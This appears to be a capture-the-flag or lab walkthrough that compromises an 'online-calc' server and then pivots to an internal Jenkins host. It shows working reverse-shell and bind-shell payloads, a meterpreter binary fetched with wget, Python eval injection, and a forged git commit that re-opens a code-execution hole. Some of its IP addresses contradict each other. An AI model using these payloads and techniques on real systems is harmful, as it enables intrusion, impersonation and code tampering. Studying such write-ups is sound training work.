# | The NENmSIS project

### Nmap[​](broken-reference) <a href="#nmap" id="nmap"></a>

`nmap -p- -A 192.15.42.3 -T4`

```
PORT     STATE SERVICE VERSION80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.29 (Ubuntu)5000/tcp open  upnp?| fingerprint-strings: |   DNSVersionBindReqTCP, RTSPRequest, SMBProgNeg, ZendJavaBridge: |     HTTP/1.1 400 Bad Request|     Connection: close|   GetRequest, HTTPOptions: |     HTTP/1.1 200 OK|     Content-Length: 1127|     Content-Disposition: inline; filename="index.html"|     Accept-Ranges: bytes|     ETag: "e021c45eee1c6fcb7629edafba897555f86958c5"|     Content-Type: text/html; charset=utf-8|     Vary: Accept-Encoding|     Date: Sun, 12 Jun 2022 13:47:08 GMT|     Connection: close|     <!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon href=/favicon.ico><title>online-calc</title><style type=text/css>/* Your local CSS File */|     @font-face {|     font-family: 'Roboto';|     font-style: normal;|     font-weight: 700;|     src: local('Roboto-Regular'), local('Roboto-Medium'), url(fonts/Roboto-Medium.ttf) format('truetype');|_    }</style><link href=/css/main.7ee6b179.css rel=prefetch><link href=/js/main.7112507e.js rel=prefetch><link hre8000/tcp open  http    Werkzeug httpd 1.0.1 (Python 2.7.17)|_http-title: Site doesn't have a title (text/html; charset=utf-8).| http-git: |   192.15.42.3:8000/.git/|     Git repository found!|     .git/config matched patterns 'passw' 'user'|     Repository description: Unnamed repository; edit this file 'description' to name the...|     Last commit message: Minor formatting and removed unneeded functions... |     Remotes:|_      http://online-calc.com/projects/online-calc|_http-server-header: Werkzeug/1.0.1 Python/2.7.17Running: Linux 4.X|5.XOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5OS details: Linux 4.15 - 5.6Network Distance: 1 hop
```

### Dirb[​](broken-reference) <a href="#dirb" id="dirb"></a>

#### Port 80[​](broken-reference) <a href="#port-80" id="port-80"></a>

`dirb http://online-calc.com /usr/share/dirb/wordlists/big.txt`

Nothing interesting

#### Port 5000[​](broken-reference) <a href="#port-5000" id="port-5000"></a>

`dirb http://online-calc.com:5000 /usr/share/dirb/wordlists/big.txt`

Nothing interesting

#### Port 8000[​](broken-reference) <a href="#port-8000" id="port-8000"></a>

`dirb http://online-calc.com:8000 /usr/share/dirb/wordlists/big.txt`

There is a web app there:

But, if we use the default list instead: `dirb http://online-calc.com:8000`

In the first link, we obtain a file:

That contains `ref: refs/heads/master`

That contains `55978eb6919b2120dd2c3241b4bb705cc67e3d74`

So now, we try `dirb` with more directories:

`dirb http://online-calc.com:8000/.git/`

And this information is contained:

```
[user]    name = Jeremy McCarthy    email = jeremy@dummycorp.com    password = diamonds    username = jeremy[remote "origin"]    url = http://online-calc.com/projects/online-calc    fetch = +refs/heads/*:refs/remotes/origin/*
```

#### Clone repository[​](broken-reference) <a href="#clone-repository" id="clone-repository"></a>

Now that we know thata a .git repository exists, we can clone it `git clone http://online-calc.com/projects/online-calc/`

There is nothing interesting in the files. Let's check the git logs to get some more context on the cloned repository and see if anything interesting can be located in the commit history: `git log`

We can check the code changes made to fix the arbitrary file read vulnerability.

`git diff 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd 17f5d49be5ae6f0bc41fc90f5aabeccc90f6e2cd`

There is a new function `send_from_directory` used to send any file requested from the root directory of the Flask server. If the requested path contains `..` or `%2E` , it returns a 404 response. So now we can see what changes in the folloging push: `git diff 4bcfb590014321deb984237da2a319206975170f 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd`

Notice that in order to fix the bug, a function named `isValid` was added to the code and in the `evaluate`function, the `isValid` function is called before the user-supplied data is passed to the `eval` function. Also notice that the `/` character in the user input is being replaced by `* 1.0 /`in the `evaluate`function. So, lets modify the API.py code and make it vulnerable to RCE again. We comment the input validation check before the call to `eval`:

Now commit these changes to the repository:

```
git statusgit add.git commit -m "Bug Fix" --author "Jeremy McCarthy <jeremy@dummycorp.com>"
```

The above commands would commit the changes to the repository with the author name and email set to that of Jeremy McCarthy's. Let's push these changes to the remote repository: `git push`

That can be confirmed by pulling API.py from the Flask server:

`curl http://online-calc.com:8000/API.py`

### Prepare a reverse shell[​](broken-reference) <a href="#prepare-a-reverse-shell" id="prepare-a-reverse-shell"></a>

The target machine `online-calc.com` is on the same network as that of `eth1`. So we well use the IP of that interface in the exploit: `ip a`

Since the `/` characters in the user payload would be converted to `* 1.0 /` by the `evaluate` function, we will base64-encode the payload.

We use a Reverse Shell of [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

`echo 'bash -c "bash -i >& /dev/tcp/192.73.152.2/4444 0>&1"' | base64`

```
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuNzMuMTUyLjIvNDQ0NCAwPiYxIgo=
```

We start a netcat listener `nc -lvp 4444` Copy the following payload `__import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuNzMuMTUyLjIvNDQ0NCAwPiYxIgo= | base64 -d | bash")` to the calc on port 5000.

The above payload decodes the base64 encoded payload we created in the previous step and passes it to `bash` for executing the reverse shell payload. Since our payload will be executed by the `eval` function in Python, that's why we are importing Python's `os` module to execute the desired commands. Now press the `=` button to supply the payload to the backend.

We now find a flag file: `find / -iname *flag* 2>/dev/null`

Even though we have compromised the target machine, we are still limited in the things we can do with the normal shell session. It would be quite good to gain a meterpreter shell session instead to carry out further exploitation.

### Meterpreter session[​](broken-reference) <a href="#meterpreter-session" id="meterpreter-session"></a>

We generate a payload. `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.73.152.2 LPORT=5555 -f elf > payload.bin`

We will start a Python-based file server on the Kali instance and serve the generated payload binary: `python3 -m http.server 80` Now we can download the payload binary on the compromised target machine:

```
wget http://192.73.152.2/payload.binfile payload.binchmod +x payload.bin
```

Set up a multi handler on the kali instance:

```
msfconsole -quse exploit/multi/handlerset PAYLOAD linux/x64/meterpreter/reverse_tcpset LHOST 192.196.85.2set LPORT 5555run
```

And now execute the `./payload.bin` on the remote host.

We check the interfaces of the remote machine: `ifconfig`

```
Interface 22396============Name         : eth0Hardware MAC : 02:42:c0:49:98:03MTU          : 1500Flags        : UP,BROADCAST,MULTICASTIPv4 Address : 192.73.152.3IPv4 Netmask : 255.255.255.0Interface 22398============Name         : eth1Hardware MAC : 02:42:c0:8d:4d:02MTU          : 1500Flags        : UP,BROADCAST,MULTICASTIPv4 Address : 192.141.77.2IPv4 Netmask : 255.255.255.0
```

So we have discovered a new interface and a new network.

Now since we have access to the first target machine, we can easily access the second machine. But if there is some webapp running on that second machine, we can't access it directly, unless we have a proxy setup to relay the request via the compromised target. Background the meterpreter session and check the meterpreter session identifier:

Now add a route to the network accessible only via the first target machine at `online-calc.com` . `route add 192.141.77.0/24 1` The last argument to the above command is the identifier of the meterpreter shell session.

Now let's use the `socks_proxy` auxiliary module to convert the meterpreter session to serve as a socks proxy:

```
use auxiliary/server/socks_proxyset VERSION 4aset SRVPORT 9050run -j
```

After the above commands, a socks proxy server (having version 4a) would be started on port 9050. It would be started as a background process (since we used the -j flag). Now anything we sent over port 9050 would be sent over to the network we added to the route (that is, `192.129.183.0/24`).

Now, we can scan the second target machine using the proxychains tool. We will use proxychains to do the job. By default, proxychains makes use of port `9050` and that's the reason we configured the socks proxy server to listen on that port.

`proxychains nmap -sT -P0 192.129.183.3` The above command would scan the second target machine using nmap. Since it's not directly reachable we have used proxychains tool, which would make use of the proxy server we started, using the meterpreter session to the compromised target machine (at online-calc.com).

So we can also use `proxychains nmap -Pn -sV -sC -p8080 192.129.183.3`

Cause there is an open port in `8080`, we need to investigate the web.

### Socks proxy with the browser[​](broken-reference) <a href="#socks-proxy-with-the-browser" id="socks-proxy-with-the-browser"></a>

### Jenkins[​](broken-reference) <a href="#jenkins" id="jenkins"></a>

Scroll down on Manage Jenkins page, click on Script Console section. That should open the Groovy Script console:

Here we can execute arbitrary scripts and get a shell session! But since we are connected to the Jenkins instance over the socks proxy, we need to start a bind shell on that server and connect to it. The reverse shell won't work since that machine (on which Jenkins is running) doesn't know how to reach back to the Kali instance (which is located in a different network).

Groovy bind shell payload:

```
int port=5555;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()Socket s = new java.net.ServerSocket(port).accept()InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

**Payload Reference**: [https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell](https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell)

Once the payload has been executed in the Groovy script console, we can use netcat utility to connect to the bind shell started on the target machine (running Jenkins) using proxychains: `proxychains nc -v 192.129.183.3 5555`

### Machine hosing Jenkins[​](broken-reference) <a href="#machine-hosing-jenkins" id="machine-hosing-jenkins"></a>

`id`
